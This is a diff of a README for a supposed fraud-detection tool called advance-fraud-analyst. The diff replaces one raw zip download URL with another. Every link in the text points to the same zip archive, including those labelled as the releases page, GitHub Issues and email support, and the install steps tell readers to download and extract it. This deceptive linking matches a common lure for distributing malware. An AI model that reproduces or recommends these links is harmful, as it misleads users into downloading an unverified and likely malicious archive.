@@ -6,19 +6,19 @@ Welcome to the advance-fraud-analyst application! This tool helps you identify f
 
 ## 🔗 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip)
+[![Download Latest Release](https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip)
 
 To get started, visit the page below to download the application:
 
-[Download Here](https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip)
+[Download Here](https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip).
    
 2. **Choose the Latest Release**: Look for the most recent version listed at the top. It will have the highest version number.
 
-3. **Download the Application**: Click on the link for your operating system. It may look like "https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip". This will begin the download.
+3. **Download the Application**: Click on the link for your operating system. It may look like "https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip". This will begin the download.
 
 4. **Extract the Files**: Once downloaded, locate the ZIP file in your Downloads folder. Right-click on the file and select 'Extract All' to unpack the application.
 
@@ -67,8 +67,8 @@ The application addresses various important topics, such as:
 
 If you have any questions or encounter problems, feel free to reach out for support. You can file an issue directly on the GitHub repository or contact the support team via email.
 
-- **GitHub Issues**: [Report an issue](https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip)
-- **Email Support**: https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip
+- **GitHub Issues**: [Report an issue](https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip)
+- **Email Support**: https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip
 
 Your feedback is valuable and helps improve this application.
 
@@ -86,6 +86,6 @@ This project utilizes powerful libraries and tools that enhance its capabilities
 
 This project is licensed under the MIT License. Please check the LICENSE file for details about using this software.
 
-[Download Here](https://raw.githubusercontent.com/Johnza06/advance-fraud-analyst/main/tweel/advance-fraud-analyst.zip) 
+[Download Here](https://github.com/Johnza06/advance-fraud-analyst/raw/refs/heads/main/tweel/advance_fraud_analyst_v2.6.zip) 
 
 Now you are ready to start using advance-fraud-analyst for your fraud detection needs!
